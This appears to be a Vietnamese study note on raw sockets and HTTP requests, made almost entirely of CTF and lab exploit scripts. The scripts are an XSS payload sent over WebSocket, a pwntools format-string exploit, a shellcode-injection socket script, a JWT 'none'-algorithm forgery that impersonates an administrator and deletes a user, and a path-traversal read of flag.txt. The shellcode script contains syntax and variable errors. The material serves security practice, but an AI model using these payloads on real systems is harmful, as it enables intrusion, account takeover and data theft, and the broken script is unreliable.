# 5. raw socket và http request

## raw socket

```javascript
const WebSocket = require("ws");

// // Kết nối tới WebSocket server
// const socket = new WebSocket(
//   "wss://0a7600b303ef21c780ad0ddd003a0074.web-security-academy.net/chat"
// );
// socket.on("open", () => {
//   console.log("Đã kết nối thành công");
//   socket.send("Hello, server!");
// });
// socket.on("message", (data) => {
//   console.log(`Nhận dữ liệu từ server: ${data}`);
// });

const socket = new WebSocket(
  "wss://0a7600b303ef21c780ad0ddd003a0074.web-security-academy.net/chat"
);

socket.addEventListener("open", (event) => {
  console.log("Đã kết nối thành công");

  // Gửi dữ liệu
  const data = {
    message: "<img src=1 onerror='alert(1)'>",
  };

  socket.send(JSON.stringify(data));
});

socket.addEventListener("message", (event) => {
  console.log(`Nhận dữ liệu từ server: ${event.data}`);
});

socket.addEventListener("close", (event) => {
  console.log("Kết nối đã đóng");
});
```

### pwntools

```python
#!/usr/bin/python3.7

from pwn import *
context.binary = exe = ELF('./Level04')
p = process(exe.path)

p.recvuntil(b'check at ')
address = p.recvline()
address = address.decode('utf8').strip()
# address = address.replace('0x', '')
address=int(address, 16)

payload = p32(address)
payload += p32(address+1)
payload += p32(address+2)
payload += p32(address+3)
payload += f'%89x'.encode()
# payload = address
payload += f'%5$n'.encode()
payload += f'%6$n'.encode()
payload += f'%7$n'.encode()
payload += f'%8$n'.encode()
# p.sendline(str(payload).encode())
p.sendline((payload))
# p.sendline(str(data).encode())

p.interactive()
```

### socket

```python
import socket
import re

shellcode = "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x66\x68\x2F\x62\x69\x6E\x69\xe3\x52\x69\xe2\x53\x69\xe1\xcd\x80"
HOST = 'localhost'
PORT 10003
a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

data = s.recv(102400)
data = s.recv(102400)
data = s.recv(102400)
#Lay dia chi chuoi nhap vao
string_addr = data [8:8+8]
# Chuyen chuoi sang so
string_addr = int(string_addr, 16)
# Tinh dia chi shellcode
string_addr += 16 + 4
# Gui ma khai thac
a.send("A"*16+ format (string_addr, 'x').decode("hex") [::-1] + shellcode + "\n")
a.recv(102400)
# Gui lenh cat flag
s.send("cat flag\n")
# Lay flag
print s.recv (102400)
print s.recv (102400)

s.close()
```

## http request

### Python

```python
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote
import jwt
import base64


session = requests.Session()
url = 'https://0a4b00b604f9701d8568f8fe00e60012.web-security-academy.net'

response = session.get(url + '/login')

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

data = {
    'csrf': csrf,
    'username': 'wiener',
    'password': 'peter',
}

response = session.post(
    url + '/login',
    data=data,
    verify=False,
    allow_redirects=False,
)

token =  response.headers['Set-Cookie'].split('; ')[0].split('=')[1]

decode_token = jwt.decode(token, options={"verify_signature":False})
print(f"Decode token: {decode_token}\n")

decode_token['sub'] = 'administrator'
print(f"Modified payload : {decode_token}\n")

modified_token = jwt.encode(decode_token, None, algorithm=None).decode()
print(f"Modified token : {modified_token}\n")

session_data = modified_token
cookies = {
    'session' : session_data,

}

response = requests.get(
    url + '/admin/delete?username=carlos',
    cookies=cookies,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

### javascript and typescript

```javascript
import axios from "axios";

const url: string = "http://103.97.125.56:32171";
axios
  .get(url + "/read?name=../../../../../../../../flag.txt")
  .then((response) => console.log(response.data));
```
